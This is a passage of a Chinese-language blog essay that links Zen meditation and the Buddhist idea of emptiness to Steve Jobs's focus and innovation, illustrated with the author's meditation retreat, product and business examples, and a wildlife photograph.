p>是谁告诉你“不”这个答案的呢？也是你的心。和你的心好好谈一谈，当你的心告诉你你要成为一个什么样的人，你的愿力就会慢慢生起。愿力就像一颗种子，会发芽，会长大。台湾阿里山曾经有一棵树，4000岁了，很高很大，被称为阿里山神木，是台湾著名的景点，郭台铭说过：</p>\n<blockquote>\n<p>“阿里山的神木之所以大，4000年前种子掉到土里时就已决定了，绝不是4000年后才知道的。”</p>\n</blockquote>\n<h3 id=\"二、专注力\"><a href=\"#二、专注力\" class=\"headerlink\" title=\"二、专注力\"></a>二、专注力</h3><p>强大的心力的基础是高度的专注力。佛学说心念如暴流，一个念头接一个念头，在我们脑海中像放电影一样闪过，我们工作中非常容易走神，开小差，有时候我们自己甚至都没有意识到，有时候虽然意识到了，却无力自拔。乔布斯是一位极度专注的人，决定做一件事情之后，总是全情投入，全力以赴，不达目的决不罢休。他的一个副总裁乔纳桑·艾维回忆说，乔布斯是他一生中所遇到的最为专注的人。“这种专注并非来自你的内心的渴望，比如‘周一我需要更加专注’，而是在每一分钟都保持专注。”</p>\n<p>乔布斯高度的专注力，我相信和他终身坚持禅修是有直接关系的。禅修是非常好的锻炼专注力的方法，这一点我有切身的体会，可以和大家分享一下。我去年去缅甸参加了一次“内观禅”的禅修，收获比以往都要大。内观禅是一种南传的在东南亚和西方社会都有广泛影响力的禅法，有坐禅和行禅两种方式。我简单介绍一下，行禅看起来很简单，就是在我们禅修的屋子走一个来回，大概20米，一个正常人慢慢走大概需要三十秒至一分钟，经过几天训练后，我把时间延长到了46分钟，每秒钟我都在走，没有一秒钟是懈怠的，怎么做到的？方法是把走一步分为十四个步骤例如“抬脚后跟”、“脚掌前移”、“脚掌触地”等，先在心里作一个标记然后一丝不苟地执行每个细小的步骤，整个过程精神高度集中，一点点开小差，就会走得不对或者走得太快。坐禅法门是用心关注腹部微小的移动在，过程中，身体可能会有痒痛的情况，我们不必去挠它，而是把心念转到不适之处，静静地观察它，可能在几秒种内，这种痒痛的感觉就消失了，然后我们再将心念移回腹部。有些时候，你开小差了，例如忽然想看股票了，你的心马上就能觉察到，你在心里马上给这个细小的念头打上一个标记：妄想，不必试图马上把心念收回来，而是静静地观察这个妄想，可能在零点几秒的时间里，这个妄想就像一个肥皂泡一样啪地消失了，然后你再将心念移回到腹部。刚开始妄想很多，但随着我们不断练习就大幅减少了。通过练习，当我们的心可以保持高度的专注，也就是禅修里常说的“定”或“止”之后，我们就慢慢开始进入“观”的阶段，观什么呢？观察身体运动的现象，体察身体细微的感受以及各种念头的生灭，洞察一切现象无常无我的本质，从而开启我们的智慧。</p>\n<p>经过这种训练后，我觉得自己的专注力和觉察力都得到了比较大的提升，并已开始运用到工作中，一般我会调一个闹钟，例如四十分钟，规定这段时间内自己绝对不能开小差，在这个过程中，会有很多妄念从心里飘过，例如想看下微信、翻翻报纸、琢磨一下哪里吃饭等等，现在会很快察觉并重新专注，时间到了后休息一下然后继续。乔布斯所修的禅法是曹洞宗的禅法，我看了他前女友的传记了解了一下他禅修的法门，会有很多不一样，但是都以提升专注力和觉察力为主要目标，进而提升自己的智慧。</p>\n<p>乔布斯几十年的禅修，我相信会对他的专注力和觉察力提升有很大的帮助。他短暂的一生中颠覆这个世界的次数是五次，可见他思考的效率是何等的惊人，我相信只有极高的专注力，才可能提升他思考的效率。打个比方，普通人的心的专注力就像打开手电筒的一束光，光很弱，也很散乱，照到几米外已经很模糊了，而乔布斯的心就像一束笔直的激光，亮度非常强，能照射到很远而不散乱，这么强劲的一束光，能量当然无以伦比。</p>\n<p>现在有一种观点，把坐禅和禅学脱钩，不关心禅的见地，也不知道什么是空性，把坐禅纯粹当作一种提升专注力的方法，这非常可惜，类似买椟还珠。还有一种观点，很传统的，认为只要专心打坐就能证悟到各种境界，这也不对，禅修也叫止观，止而后能观，打坐是一种好的让心安顿下来并保持高度专注（也就是止）的方法，止是用来观的，光有止没有观，就像一个长跑运动员，做了很多很漂亮的准备动作，又踢腿又一字马，然后回家了，不跑步了，然后宣布自己跑步水平很高，这可能吗？一些人打坐打得很好，据说已经证悟到什么境界了，但在现实生活中，碰到一点小事，就六神无主，心烦气燥，不知道怎么解决问题，你能相信他的境界吗？</p>\n<p>六祖对禅定的理解，相比原始佛教有很大的突破，他激烈地反对以单纯打坐来修证佛法，他说：“道由心悟，岂在坐也。”他认为长时间打坐，住心观静，是一种病，（“住心观净，是病非禅，长坐拘身，于理何益”。）综观全书，他并不反对传统的坐禅，但是他并不认为这是主要的证悟方法，他说“佛法在世间，不离世界觉，离世觅菩提，恰如求兔角”，他认为应该在世间，在日常生活、衣食住行、工作学习中修炼，六祖继续阐述说：“此法门中，无障无碍，外于一切善恶境界，心念不起””、“若见诸境心不乱者，是真定也”，大意是在一切善恶境界中，保持心境不乱，见到自心清静本性，就是“真定”，我们要在这种真定中修行。</p>\n<p>我的理解是，我们在工作生活中，一心一意，高度专注，是六祖说的这个“真定”的基础，但是，这种专注，还没达到六祖说的“真定”的境界，我们还要对“空性”（后面会有详细介绍）有非常深入的认识，才可能不思善不思恶（“外于一切善恶境界，心念不起。”）。</p>\n<p>我把禅修分为两个层次，初级的层次就是做每一件事情，保持高度专注，例如吃饭的时候专心吃饭，阅读的时候，专心阅读，拍拖的时候，专心拍拖，一心一意，就是禅修，更高级的层次就是，在保持高度专注的基础上证悟空性，我在后面两章会总结证悟空性的三种方式，我先举例其中一种方式，在高度专注的基础上思考事物的因缘，洞察本质，更进一步总结规律指导实践，是更高层次的一种禅修。</p>\n<p> 乔布斯所说的专注其实还有另外一层含义，那就是聚焦“focus”，之前所说的是集中精神“concentrate one’s attention”,乔布斯在一次采访说过“专注和简单（focus andsimplicity）一直是我的秘诀之一。简单可能比复杂更难做到：你必须努力厘清思路，从而使其变得简单。但最终这是值得的，因为一旦你做到了，便可以创造奇迹。”</p>\n<p>乔布斯所说的这种专注和简单是直接相关的，如果太复杂，心即散乱，就很难保持专注，只有简单，才能做到专注，只有专注，才能极致。所谓做减法，就是这个道理。乔布斯还把他领悟的“简单”用心注入到他所设计的产品当中。乔布斯当年重返苹果后，大刀阔斧地减少电脑的品种，只提供四种，横向是专业用和家用，纵向是笔记本和台式机，iPod只提供两种型号，而iPhone更是极致到只有一种型号，而且iPhone的界面非常简单，只有一个按键，但功能却非常丰富，当年一推出来，就轰动世界。乔布斯说过：“专注的核心在于你要敢于否定，对那些好创意说不！”，一个产品里加入很多好创意，听起来很好，但是可能会太复杂而影响简单，影响了简单的设计就不是最好的设计。</p>\n<p>​有一个很值得深思的故事，微信张小龙说的，他说：</p>\n<blockquote>\n<p>“‘摇一摇’这个功能上线后，Pony发了一封邮件给我，说我们是不是应该仔细考虑一下，如果竞争对手来模仿，会不会在上面叠加一点东西，就说他创新了。我回复说，我们现在的这个功能已经做到极简化了，竞争对手不可能超过我们了，因为我们是做到了什么都没有，你要超过我们总要加东西吧，你一加，就超不过我们了。”</p>\n</blockquote>\n<h3 id=\"​三、创新力\"><a href=\"#​三、创新力\" class=\"headerlink\" title=\"​三、创新力\"></a>​三、创新力</h3><h4 id=\"1-空性的世界\"><a href=\"#1-空性的世界\" class=\"headerlink\" title=\"1. 空性的世界\"></a>1. 空性的世界</h4><p>所谓创新就是无中生有，包括思想、产品、艺术等，重大的创新我们称为颠覆。乔布斯至少五次颠覆了这个世界:一是通过苹果电脑Apple-I，开启了个人电脑时代；二是通过皮克斯动画，颠覆了动画产业；三是通过iPod，颠覆了音乐唱片产业；四是通过iPhone，颠覆了手机通讯产业；五是通过iPad，颠覆了平板PC产业。我们有理由相信，乔布斯找到了颠覆这个世界的密钥，只要他想，他就能不经意地颠覆一下，我个人认为，禅学中的“空性”，正是这把密钥。</p>\n<p>什么叫空性？也就是缘起性空。很多年前我就很喜欢看佛学的书，学习了很多佛学概念，千头万绪，头脑还是一塌糊涂，直至有一天，是08年的一个秋夜，有一天我看南怀谨的《如何修证佛法》，书里写道：</p>\n<blockquote>\n<p>“今年正月间，一位老朋友萧先生来看我，临走时问了一句话：‘释迦牟尼佛十九岁出家，最后抬头睹明星而悟道，他悟的是什么？’这个问题如果是别人问，倒没有什么重要；但萧先生研究佛学多年，他提出了这个问题，却是不比寻常。”南怀谨想了又想，“我当时回答我的老朋友萧先生说：‘他悟的就是那个缘起性空。’萧先生说：‘嗯，对了！’”推开门就走了。”</p>\n</blockquote>\n<p>我看这段文字的时候，恍然大悟，那个晚上弯月如钩，秋凉似水，我是一夜无眠，种种佛学知识和一些人生经历如电光火石，在头脑中像放电影一般掠过，“缘起性空”这几个字，提纲挈领，把林林总总都串了起来，经过那个晚上，我感觉有所长进了。</p>\n<p>什么叫缘起性空呢？缘起是指世间一切事物是由一些条件（因缘）聚合在一起而生起的，这种生起，性质是“空”的，“空”是指这些条件都不是稳定的，一旦一些重要的条件发生改变，事物的性质就会跟着发生变化，因此，一切事物都不是可以独立存在的，都不是常住不变而是在变化中不断发展的，所谓证悟空性，是指通过修行，不但在理论上明白这一点，更要在实践中证明这一点。缘起性空听起来有点抽象，搭积木是很好的比方，一个房子由若干形状大小不一的立方块堆砌而成，不同的方块组合造就不同的房子，每一座房子的组成方块可以挪来挪去，小的挪动没问题，挪动大了，房子就面目全非，甚至有可能就倒了，世间万事万物莫不如是。《金刚经》说：“若见诸相非相，即见如来.”所谓相是一个事物的表相，所谓“非相”是指我们不要满足于只了解它的表相，而是要穿透它的表相，弄清楚是由什么条件以一种什么样的方式聚合在一起生成这个事物的，如果做到这一点，那么我们就明白事物的本质了，智慧觉性也就生起了（“即见如来”）。</p>\n<p>更进一步，如果我们可以把一些条件聚合在一起，这种组合的方式是前所未有的，看看是否可以成立，这是一个不断试错的成功机率很低的过程，如果真的可以成立，那么所谓创新就横空出世了。这个过程和搭积木房子基本是一样的，你不停尝试，用各种形状的方块试来试去，加加减减，直到有一款，很漂亮，自己满意大家喜欢，创新就大功告成了。</p>\n<p>以乔布斯发明iPod为例说明，iPod之前早就有MP3播放器了，但一直流行不起来，乔布斯很早就打算开发一款这样的产品，但一直觉得时机不成熟。直到2000年，他知道日本东芝发明了一种微型硬盘，体积只有一美元硬币那么大，但容量高达5G，乔布斯敏锐感觉机会终于来了，接着苹果很快找到了一种电池，可以支持连续十小时播放音乐，另外苹果的设计师发明了一非常有创意的拇指转盘，单手就可以操作，即使多达1000首歌，但要找到任何一首歌轻而易举，最后一个要解决的问题是：歌曲在哪里呢？乔布斯和五大唱片公司谈，可以在iTunes商店上售卖单曲，价格最多只能是0.99美元，唱片公司几经犹豫最后还是同意了。总结一下，硬盘、电池、拇指转盘和单曲销售这几大关键条件全部具备后，iPod销售取得了极大的成功，颠覆了整个音乐唱片行业。</p>\n<p>iPod成功后复盘，逻辑很清晰，大家可能认为本来就该如此，事实上，在当时研发的时候，有无数个选择项，乔布斯的智慧就在于他能从无数个选项中用非常苛刻的标准选择出最合适的，把它们组合在一起。有一次乔布斯在一个采访中说，“设计一款产品，你得把五千个问题装在脑子里，必须仔细梳理，尝试各种组合，才能获得想要的结果。”</p>\n<p>把支持事物成立的条件加加减减，颠来倒去，进行各种异思天开的组合，像搭积木一样，是进行创新很好的一种思路，有一本颇有影响的探讨创新的书叫《水平思考》，主要就是根据类似理念而设计了多种创新的思路，我结合现实案例介绍其中几种。</p>\n<p>先看一个把因果颠倒进行创新的思路，iPhone一代推出的时候，和电讯公司的合作采用区域指定甚至独家合作的方式，同时提出了一个条件，就是要求分享苹果客户的电讯资费，电讯公司大吃一惊，因为传统认为是电讯公司帮助手机公司卖手机，苹果有什么资格要求分享客户的电讯资费呢？但乔布斯却认为，是iPhone给这些电讯公司带来了大量的新客户，因果互换了，这么离经叛道的合作方式，最后居然谈成了。相似的案例是非常轰动的综艺节目《中国好声音》，这种选秀节目传统是老师选择学生，但是，好声音的做法却是学生选择老师，也算是某种形式的因果互换，指导老师为了吸引学生加入他的战队而想方设法，抢学生的场面火爆，形式非常新颖，结果一炮走红，成了一款现象级的综艺节目。</p>\n<p>再看另一种思路，就是在设计的时候随机增加一个条件，看看能不能成立，相当于搭积木的时候随机增加一个立方块。举个真实的例子，有一次我做这种创新练习，设计一款新的杯子,我问一个朋友说，你现在看到了什么，她到处看了下说她看到了温度计，温度计和杯子有什么关系呢？我突然想到了，妈妈给小婴儿喂水的时候总要反复用热水混一些冷水来调试，一会热水加多了，一会冷水加少了，非常麻烦，为什么不可以生产一种带有温度刻度的杯子，直接标示水温，以减轻妈妈的负担？</p>\n<p>再介绍一种思路，就是思考某件事情有哪些特性是最重要的，大家认为是最理所当然的，然后考虑能否打破这种特性，相当于搭积木的时候把核心的一些立方块抽掉看看会发生什么情况。先举一个简单的例子，杯子有什么主要特性？能列出好几条，其中一个是它有一个平的底座，这样才能放在桌面上，这个特性是否可以打破？能不能生产一个没有平的底座的杯子呢？真的就有人生产了这样一种杯子，底是尖的，你不能直接放在桌子上，但可以放在一个有洞的托架上，为什么要生产这么奇怪的杯子呢？有一些酒吧老板喜欢，他们希望顾客多喝酒，不要老把杯子放在桌子上半天不喝一口。顾客拿着尖底的杯子，放下来不方便，不经意中就会一喝再喝，从而刺激了酒的销售。</p>\n<p>再举一个案例，一个商场招商，商场提供服务，进场的商家交纳佣金或者租金，这是天经地义的事情吧。eBay来中国发展的时候，采取的就是佣金模式，和美国一样，商家根据成交额的一定比例，一般是5%左右，向eBay交纳费用，马云也打算开这样一家店，不过，他的想法令所有商家都大吃一惊，他说我一分钱都不收，服务做得比eBay还好，这不是天上掉馅饼的事情吗？各路商家蜂涌从eBay迁移到淘宝，生意非常火爆，很快就超越了eBay中国。不收佣金，淘宝怎么赚钱呢？把海量的客户和商家吸引来之后，淘宝卖“搜索排名”，例如你在淘宝搜索“杯子”，如果你想排名靠前，是要交纳不菲的费用的，这个完全创新的商业模式被证明是利润极为丰厚的，2016年去年阿里巴巴收入1011亿元，其中搜索广告占542亿元，占比54%。马云这个创意价值多少钱呢？最新是超过了4500亿美元。</p>\n<h4 id=\"2-将心注入\"><a href=\"#2-将心注入\" class=\"headerlink\" title=\"2. 将心注入\"></a>2. 将心注入</h4><p>下面我换一个角度继续探讨创新的问题。大家看一下这张照片</p>\n<p><img src=\"/blogimg/jobs01.jpg\" alt=\"jobs01.jpg\"></p>\n<p>这张照片是我在2016年2月在加拿大班夫一片低矮的树丛里拍到的，当时已近傍晚，大雪纷飞。照片背景很黑色很魔幻，这只灰林鸮那一刻刚好把翅膀收起来在空中滑翔，双目有神，姿态奇特，灰林鸮在《哈里波特》里是魔法世界传递消息的信使，我当时按下快门后回看照片就有一种强烈的感觉，它就是那个信使，魔法世界有大事发生，它有一封非常重要的信要尽快送给哈里波特，虽然昏天暗地，漫天大雪，它非常努力，历尽艰辛，日夜兼程，最终不辱使命。这个故事如何？我自己都被打动了，可能评委也被这个故事打动了，最终这张照片获得了《美国国家地理》2016年全球摄影比赛中国区自然类的二等奖。</p>\n<p>大家再看一眼这只灰林鸮，然后闭上眼睛，然后用你的“心”去看一下这只鸟是什么，我觉得是魔法世界的信使，还有好多人说像是一条在漫天星光中飞翔的神鱼，不同的人在心里看到了不同的东西。这只真实的灰林鸮其实不过是匆匆掠过树梢，快门一按，它飞进了我的心，当它飞进了我的心后，就发生了一些变化，它已经从客观时空分离出来，失去了时间的广延性和空间的延展性，继而成了我内心所编织的一个动人的故事的主角——“魔法信使”，它从一个客观事物变成了我的纯粹的精神现象，从那刻起，它就不再是一只普通的鸟了，它承载了我对它的一些感情或者幻想，可以说，这只鸟由于我“将心注入”，它重获新生，有了全新的意义。</p>\n<p>我希望大家意识到，“将心注入”是一件多么神奇的事情。“钻石恒久远，一颗永留传。”DeBeers这句广告词大家都听过吧？钻石不过是块闪烁的石头，但被注入“爱”后，它就成了爱情浪漫坚贞的象征，身份百倍。咖啡豆不过是用火烤后有点香味的豆子，但是自从星巴克把“优雅浪漫人生”注入给它，它就伴随着星巴克的扩张风靡了全世界。乔布斯设计的MacBook笔记本有一个睡眠指示灯，它闪烁的频率是多少，大家有留意吗？是每分钟12次，与一个成年人正常呼吸频率是一致的，自从这个笔记本被乔布斯“将心注入”，可以和人一起呼吸，它就获得了灵魂，而不再是一台冷冰冰的机器了。iPhone 问世的时候，它的质地、线条、色泽，还有你抚摸着它的那种手感，有一种无法用语言表达的神秘的魔力，全世界无数的人喜欢它以致为它发狂，喜欢到什么程度呢，据说有人愿意卖肾换机，生命简约优雅，自成其美，乔布斯将心注入，将他领悟的这种生命之美，通过一款iPhone传达给世人，在那一瞬间，你感受到了，你被深深打动了，你是被什么打动的，是乔布斯的一颗心！</p>\n<p>看了乔布斯1987年接受采访的一段视频，深受感动，他说：</p>\n<blockquote>\n<p>“嬉皮士运动启发了我，有些东西是超越日常忙碌的生活的，生活不仅仅是工作、家庭、财产、职业，我们每个人都能感受到某种冲动，许多人想找回生命的意义，有人去流浪，有人在印度神秘仪式里寻找答案，嬉皮士运动大概就是这样，他们想寻找生活的真相，生活不应该是父母过的那样，正是因为这种精神，有人宁愿当诗人也不愿意做银行家，我想把这种精神注入产品里（“I think  that same spirit canbe put into product.”），只要用户使用产品，就能感受这种精神。麦金塔用户真心喜欢我们的产品，在这之前你很少听人说真正喜欢某种商业产品，但你可以从麦金塔感受某种奇妙的东西。”</p>\n</blockquote>\n<p>禅说：“青青翠竹，尽是法身,郁郁黄花，无非般若。”在修行人的眼里，黄花并非无情物，他们在一朵美丽的黄花里发现了神秘的般若法身，一台手机亦然。世尊有正法眼藏，涅槃妙心，实相无相，微妙法门，于灵山会上拈花示众，是时众皆默然，我觉得乔布斯正是那个见拈花而破颜微笑的人，而且他通过一个手机，不立文字，直指人心，把他的领悟传达给全世界。</p>\n<p>岂止乔布斯，那些大师们的作品之所以卓越不凡震撼人心，是由于你能从他们的作品中强烈地感受到他们对美、对人性、对生活强烈而独特的感悟。普通工匠的作品其实也反应了他们的感悟，之所以平庸，是缘于他们还缺乏更深层次的思考。2010年乔布斯接受日本电视台的采访，谈到创业，他说为了赚钱而创业有很大的可能不会成功，很多成功的创业者创业的初衷并不是为了赚钱，而是他们对这个世界有些不同的想法，但没人听，他们不得已，只好开家公司，通过他们的产品向世界表达。这段话给了我很大的启示，创新又何曾不是如此？你现在在做创新，是为了什么？是为了赚更多的钱？那按乔布斯的逻辑，那很有可能是不会成功的，如果你对这个世界有了一些新的想法，强烈地想表达出来，那么，你将这种新想法通过你的心注入到你的产品里，这样的一种创新，或许有成功的可能。</p>\n<p>对乔布斯影响很大的一本书——铃木俊隆的《禅者的初心》写道：“做任何事，其实都是在展示我们内心的天性。这是我们存在的惟一目的。”从这个角度来理解创新，或许更接近创新的本质了，乔布斯以颠覆世界为已任的一生，其实都是在实践铃木俊隆禅师的这句话。关于禅的“将心注入”，我还会在最后一章的“心与世界的关系”里作更深入的探讨，并提升到“道由心创”的高度。</p>\n<h4 id=\"3-心无所住\"><a href=\"#3-心无所住\" class=\"headerlink\" title=\"3. 心无所住\"></a>3. 心无所住</h4><p>换一个角度继续探讨创新，还是回到这只灰林鸮，它进入我的内心成为我的一个精神现象后，就脱离了它原来的时空，而进入了一个新的精神时空，在这个新的时空里，只要我敢想，它就敢变，想怎么样就怎么样，它可以头长两只犀牛角，它可以穿越时空回到盛唐，它也可以变身为一个年轻人回到古希腊与苏格拉底相处一个下午探讨哲学的问题。在心的时空里，没有限制，更没有逻辑。禅宗有些话例如“石上裁花空中挂剑”、“无柴猛烧火”、“三冬花木秀,九夏雪霜飞”，叫人摸不着头脑，还有一则故事，说一位喇嘛避雨，躲进小小的蜗牛壳里，人没有因此缩小，蜗牛也没有因此变大，这可能吗？有人解释是特异功能，其实这不是好的解释，禅宗不过是用这些故事，打破我们对常识还有科学的种种认知，打破宇宙时空的各种限制。一百多年前，有作家幻想着终有一天人可以长着一双翅膀在天空翱翔、乘着飞船去月球旅行等等，当时听起来是如此的荒诞不经，但今天都成为了现实。</p>\n<p>《金刚经》有一句著名的经文“无所住而生其心”，六祖惠能听了这句经文而开悟，什么叫“生其心”，就是我们的心生起一个念头，例如思考一件事情，什么叫“无所住”，就是我们不要被现实的各种条件所束缚。因为所有这些条件、限制都是暂时的、脆弱的、随时可能发生变化甚至消亡的，心所想久“住”也“住”不下来。我们说禅是超越逻辑的，为什么呢？因为所谓逻辑，换一个角度看就是现成的思维路径，这条路从哪里来，往何处去，是有一定规则的，沿着这条路走一定能走到某一个地方，禅强调无所住，就是要大家走一些从来没有人走过的路，既不知道从何而来，也不知道该往何去。无所住而生其心，意味着抛开一切成见，打破一切框框，所谓创新，正需如此。</p>\n<p>1997年，苹果公司制作了非常经典的一则广告“Think different”。我觉得“无所住而生其心”，译成英文“Think different”也还不错。,广告中的那些特立独行、打破常规的伟人和乔布斯本人，正是践行“无所住而生其心”从而改变世界的光辉典范。</p>\n<p>我们再来看以下两个案例。的士这种交通工具，是需要拥有专门的牌照才可以上路的，普通人买的私家车是不可以载人营运的，全世界基本都这样，直到2010年，一个美国小伙子推出了一款叫Uber的App,把众多利用效率极低的私家车组织起来，供大家像叫的士一样叫车，价格便宜很多，大家都很喜欢，但这种做法和绝大部分国家的的士管理法规是相抵触的，一开始Uber到处被人投诉、示威甚至打官司，但是他们非常勇敢地抗争，争辩说原来的的士制度是不合理的，现在移动互联网已经可以完美地解决车辆计费和监管的问题。在全世界民众的支持下，最终的结果是，世界各地的政府先后为Uber修改法例，从而合法化了。这个大胆的和全世界交通管理法规作对的创新，现在的估值超过600亿美元。</p>\n<p>再举一个例子，上面说到灰林鸮自从进入我的内心后可以形象百变，，我想到了近年来有一位很红的歌手叫初音未来，大家知道吗？全球有几千万的粉丝，很漂亮，其实她只是一位数字化的虚拟美女，这本来没什么，但这位虚拟美女走了一条从来没人走过的路，就是搞起了线下的演唱会，怎么做到的？原来有技术公司用3D全息技术，在舞台上再现了这位虚拟美女歌手，载歌载舞，美艳动人，非常轰动。最近雷军签约了初音未来作为红米手机的形象代言人。这位美女永远年轻，永远时尚，身材永远劲爆，永远没有丑闻，永远不知疲倦，想一想，还有比她更完美的女性吗？这是多么巨大的商机啊。未来随着AR、VR、3D打印技术的不断发展，虚拟和现实就分不清了，会有更多更有价值的创新源源不断地生起。</p>\n<p>按冯友兰的说法，中华民族是一个有强烈的哲学情结但是缺乏宗教情结的民族，儒学是主流，民众行为主要受道德约束而不是宗教约束，天性崇尚自由，不喜欢仪式，不喜欢过多的约束，1949年后,君权、族权、神权、夫权全部被推倒重来，所受的约束就更少了，所以改革开放以来，中国人特别百无禁忌，特别敢想敢干敢创新，创造了太多的经济奇迹。在移动互联网年代，以阿里、腾讯为代表的互联网崛起，创造了非常多的全新的商业模式。事实证明，中华民族确实天生就非常适合创新，这是由它的文化基因决定的。创新力直接决定一个国家的成败，就这个意义上说，我对中国未来非常乐观。</p>\n<h4 id=\"4-小结\"><a href=\"#4-小结\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h4><p>以上我从三个不同的角度，探讨了空性与创新的关系。空性到底是什么？为了世人容易理解，六祖就像一位极高明的画师，给空性画了一幅画，他说：</p>\n<p>“世界虚空，能含万物色像。日月星宿，山河大地、泉源溪涧、草木丛林、恶人善人、恶法善法、天堂地狱、一切大海、须弥诸山、总在空中；世人性空，亦复如是。”</p>\n<p>是不是很有画面感？大意是说，我们心之自性，壮阔无边，整个宇宙，现存的包括自然、人文、思想都显现其中，未来的各种变化也孕育其中。空性在哪里呢？它不是远在天边，而是在我们每个人的心里，我们需要做的就是通过了解我们的心去认识它，所谓“明心见性”，说的就是这个意思。</p>\n<p>宋代禅宗大师青原行思提出通过参禅证悟空性的三重境界：参禅之初，看山是山，看水是水;禅有悟时，看山不是山，看水不是水;禅中彻悟，看山仍是山，看水仍是水。我模仿一下，表述一下我的见地：</p>\n<p>参禅之初，看一栋屋子，就是一栋屋子：禅有悟时，看一栋屋子，不是一栋屋子，而是想象中的一栋屋子（这栋房子被拆得只剩下骨架，只存在于想象之中）;禅中彻悟，看一栋屋子，还是一栋屋子，想象中的那栋屋子隐身于现实中的那栋屋子之中。</p>\n<p>​参禅之初，你看到的是房子的表象，这种表象也是当下的真实，这种真实，是你用眼睛看到的;禅有悟时，你看到的是房子的本质——支持房子存在的条件（因缘），此处用房子的骨架来代表这些支持条件，这样的一间被拆得剩下骨架的房子只存在于你的想象之中。骨架不是恒定不变的，若有变动，房子就会变型甚至倒塌，因此这栋房子的存在是不确定的脆弱的，是随时可能变化的，用幻象来形容也很贴切，这个幻象，是你用内心“看”到的;彻悟时分,你从幻象回归真实，但这个真实和参禅之初你所感受到的真实有了质的飞跃，这种真实是如梦如幻、脆弱不堪的，你眼睛看到的真实和你内心“看”到的幻象，已经虚实合一，水乳交融了，也就是说，你既看到了屋子的表象，又看到了它的本质，既看到了真实，也感知了幻象，禅修者同时生活在真实和幻象之中，既能真切感知当下的存在，也能预知未来可能的变化。这个境界，就是《心经》里的“空色不二”的境界。</p>\n<p>修到“彻悟”，不仅仅可以预知未来的变化，更进一步，他还可能创造未来，还是以这栋房子为例，世人看起来神圣不可侵犯的一些结构，坚不可摧的一些梁柱，在他看来，都是脆弱不堪的，他内心强大到可以轻松地扭曲、移动、添加、重置这些梁梁柱柱，以无所住心重新设计，从而建造一栋新的房子，所谓创新，即是如此，这个例子也很好地说明了佛法说的“心生万法”的内涵，“心生万法”很容易被人误解，它不是指心有什么神通，能够随心所欲地变出什么东西，而是指心能够洞察世间万事万物之所以存在的那些因缘（条件），只要我们能够努力达至因缘俱足，那么我们就可以生起这些事物，后面我还会继续深入探讨“心生万法”的内涵。</p>\n<p>上一章说了乔布斯著名的“现实扭曲力场”主要包括两种力，一种是愿力，还有一种我认为就是创新力，他的创新力似乎达到了接近随心所欲的程度，能够不断地创造颠覆性的新产品，一次又一次地“扭曲”现实。他的心力如此强大，以至他周围的人不由自主地深陷其中，坚信只要和他在一起，一切皆有可能，世界定能改变。我们的内心确实是可以非常强大的，以至可以“心生万法”，从这个角度一想，那么所谓“命运”就不值得完全相信，因为只要我们努力把各种条件精心准备好，人生就具备了无限可能，如果真的有命运这回事，先天好的命运可以更好，先天坏的命运就有可能扭转。</p>\n<p>空性智慧指导我们创新，如果反过来思考，我们就可以得出一个新的非常重要的结论：进行创新就是在证悟空性！如六祖所示，我们要在“世间”的实践中证悟空性，否则，“离世觅菩提，恰如求兔角”，但是在实践中怎么证悟空性呢？我尝试总结一下，在空性智慧的指引下提升创新力，进行各种创新的尝试，就是一种非常重要的“证悟空性”的方式，一个人对空性证悟越深，他创新就越有可能成功，创新的颠覆程度和空性证悟的境界密切相关。我认为，在实践中证悟空性主要有三种方式，这是第二种。</p>\n<p>第一种是什么？在专注力这一章里，我提到缅甸的“内观禅”，通过禅坐，“当我们的心可以保持高度的专注，也就是禅修里常说的“定”或“止”之后，我们就慢慢开始进入“观”的阶段，观什么呢？“观察身体运动的现象，体察身体细微的感受以及各种念头的生灭，洞察一切现象无常无我的本质，从而开启我们的智慧。”这个智慧，就是空性的智慧，这种方法，是一种非常传统的证悟空性的方法，不过当时我还没有介绍空性，因此我等到现在才回过头来总结，除此之外，还有一些人通过观察自然现象的变化，如花开花落、月圆月缺、湖中月影、空山足音等等而证悟，也就是说传统的修行人，很多是通过观察身体、自然现象的缘起缘灭而证悟空性，我把这种方式列为三种在实践中证悟空性方式的第一种。</p>\n<p>本章末尾，我还想补充一个观点。研究创新，包括研究空性还有一个全新的角度，就是“失控”这个角度。《失控》研究的主要不是个人而是组织的进化和创新，我去年写了一篇文章《失控与投资》有详细的介绍。KK认为，我们这个世界是一个去中心化的分布式的体系，每个事物都不是孤独地存在，相互间存在各种复杂的连接，事物存在的本质在于它连接了什么，马克思说：“人是一切社会关系的总和。”表达的就是这样一个意思。事物A和事物B有连接，意味着事物A有可能对事物B产生一些或直接或间接，或强烈或微弱的影响，这种连接关系是不稳定、脆弱和随时可能发生变化的，由此可见连接和禅说的“因”有契合之处，禅的“缘起性空”用“连接”来解释也很不错。</p>\n<p>如何构造一个让创新源源不断地涌现的组织，KK认为要打造一个生态型组织，马化腾深受他的影响，撰文写道：</p>\n<blockquote>\n<p>“那些真正有活力的生态系统，外界看起来似乎是混乱和失控，其实是组织在自然生长进化，在寻找创新。”</p>\n<p>“如果一个企业已经成为生态型企业，创新就会从灰度空间源源不断涌出。从这个意义上讲，创新不是原因，而是结果；创新不是源头，而是产物。企业要做的，是创造生物型组织，拓展自己的灰度空间，让现实和未来的土壤、生态充满可能性、多样性。”</p>\n</blockquote>\n<p>也就是说，这样的一个生态型的组织，各种连接非常复杂，各种“因”（条件）非常丰富，这些“因”互相补充互相渗透，果由因生，你都想象不出它能结出一些什么奇奇怪怪的果来，所谓“失控”，就是指即使你是组织者，你也无法预测结果，这个果能长成什么样子你也不知道。</p>\n<p>一个组织成长的可能性越多越大，我称之为组织的“空性”越大，这样的组织之所以存在，不是自然而然的，而是我们的内心对大自然失控性成长的规律有深刻的洞察而人为创造的，同样是心生万法的结果。</p>\n<h3 id=\"四、洞察力\"><a href=\"#四、洞察力\" class=\"headerlink\" title=\"四、洞察力\"></a>四、洞察力</h3><p>洞察力是指洞察事物本质的能力，可能是人最重要的能力之一。乔布斯被公认为极有洞察力的一个人。一个人的成就，与他的洞察力高度相关。有很多观察的角度，我选两个角度谈谈我的认识。</p>\n<h4 id=\"1-直觉力\"><a href=\"#1-直觉力\" class=\"headerlink\" title=\"1. 直觉力\"></a>1. 